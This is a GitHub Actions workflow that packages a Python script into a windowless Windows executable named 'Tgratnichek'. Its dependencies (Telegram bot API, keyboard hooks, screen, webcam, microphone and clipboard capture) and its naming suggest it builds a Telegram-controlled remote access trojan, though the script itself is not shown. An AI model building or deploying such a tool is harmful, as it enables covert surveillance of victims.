name: Build Windows EXE (Stable)

on:
  push:
    branches: [ main ]
  workflow_dispatch:  # позволяет запустить вручную

jobs:
  build:
    runs-on: windows-latest

    steps:
    - name: Checkout repository
      uses: actions/checkout@v4

    - name: Set up Python 3.12
      uses: actions/setup-python@v5
      with:
        python-version: '3.12'

    - name: Upgrade pip
      run: python -m pip install --upgrade pip

    - name: Install all dependencies
      run: |
        pip install pyinstaller
        pip install pyTelegramBotAPI pyautogui pynput opencv-python pillow sounddevice numpy scipy pyperclip psutil requests pywin32 qrcode plyer pygetwindow

    - name: Build EXE in onedir mode (stable for DLL)
      run: |
        pyinstaller --onedir --noconsole --name Tgratnichek tgratochka.py

    - name: Upload result folder as artifact
      uses: actions/upload-artifact@v4
      with:
        name: Tgratnichek-Folder
        path: dist/Tgratnichek
